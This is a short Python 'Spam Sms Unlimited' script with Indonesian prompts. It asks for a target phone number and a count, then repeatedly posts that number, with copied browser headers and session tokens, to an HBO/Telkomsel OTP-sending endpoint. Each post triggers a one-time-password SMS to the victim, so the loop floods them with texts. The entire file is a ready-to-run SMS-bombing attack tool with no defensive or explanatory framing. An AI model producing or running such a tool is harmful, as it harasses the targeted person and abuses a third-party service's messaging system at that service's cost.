import requests,json,os
import colorama
from colorama import Fore

k = 0
os.system("clear")
print("Spam Sms Unlimited ( Tak Terbatas )")
nomer = input("Masukan Nomer Target ")
jumlah = int(input("Masukan Jumlah Spam "))
headers = {
'Host': 'hbounify-prod.evergent.com',
'content-length': '268',
'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
'accept': 'application/json, text/plain, */*',
'content-type': 'application/json;charset=UTF-8',
'dnt': '1',
'sec-ch-ua-mobile': '?1',
'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform': '"Android"',
'origin': 'https://hbounify-prod.evergent.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://hbounify-prod.evergent.com/telkomsel/login?operator=Telkomsel_HBO&channelPartnerID=HBO_D2C_ID&country=ID&deviceName=Linux+armv8l&deviceType=COMP&appType=Web&modelNo=20030107&serialNo=1553656907&sessionToken=4Kxg-HWP0-7cKG-ai1X-WfVN-yjQW-3E&territory=IDN&lang=en&returnURL=https%3A%2F%2Fwww.hbogoasia.id%2Fbilling&flow=native',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,la;q=0.6'}
data = json.dumps({
  "mobile_number": nomer,
  "sessionToken": "4Kxg-HWP0-7cKG-ai1X-WfVN-yjQW-3E",
  "channelPartnerID": "HBO_D2C_ID",
  "territory": "IDN",
  "lang": "en",
  "_token": "NDg2MjZmNzU2ZTY5NjY3OTdjMzEzNjM3MzczNDMxMzUzODMwMzE3YzQ1NzYzMzcyNDc2NTRlNzQ0MDQ4NDIzMDQwNTU2ZTY5",
})
for i in range(jumlah):
  k += 1
  pos = requests.post("https://hbounify-prod.evergent.com/telkomsel/send-otp",headers=headers,data=data).text
  if "1" in pos:
    print("Spam Sms Berhasil Ke",k)
  else:
    print("Spam Sms Gagal Ke",k)
